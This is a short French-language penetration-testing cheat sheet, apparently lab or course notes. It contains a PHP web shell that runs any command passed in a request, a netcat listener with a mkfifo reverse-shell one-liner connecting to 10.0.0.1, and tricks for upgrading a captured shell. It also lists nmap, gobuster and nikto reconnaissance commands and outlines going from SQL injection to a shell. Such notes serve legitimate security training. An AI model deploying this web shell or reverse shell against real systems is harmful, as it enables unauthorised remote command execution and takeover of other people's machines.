## Upload de fichier

Exécution de commande basique :

```php
<?php
    system($_REQUEST['cmd']);
?>
```

## Exécuter des commandes simplement

Passer en POST :
"Change request method" dans le Repeter.

encoder les commandes avec `Ctrl + U`.

## Reverse shell:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

netcat en écoute
```bash
nc -lvnp 1234
```


```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Améliorer son shell

Minimal : utiliser rlwrap
```bash
rlwrap nc -lvnp 1234
```

### Mieux si python

Dans le shell
```
python -c "import pty;pty.spawn('/bin/bash')"
```

`Ctrl + Z` pour passer en arrière plan

```bash
stty raw -echo

fg
export TERM=xterm
```

## Énumération

### Nmap

Initial
```bash
nmap -sV -sC ip -oN nmap/inital.nmap
```

Full
```bash
nmap -sV -sC -p- ip -oA nmap/full.nmap
``` 

### Gobuster

Wordlists de qualité :
[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

```bash
gobuster dir -u http://url -w /usr/share/wordlist/dirbuster/directory-list-2.3-med.txt -o gb_med.txt
```

### Nikto

```bash
nikto -h http://url
```

## From SQLi to Shell

Objectif : obtenir un shell sur la machine.

1. Faire un scan de port
2. Lancer gobuster, et nikto (cf cours reconnaissance)
3. Rechercher des failles à exploiter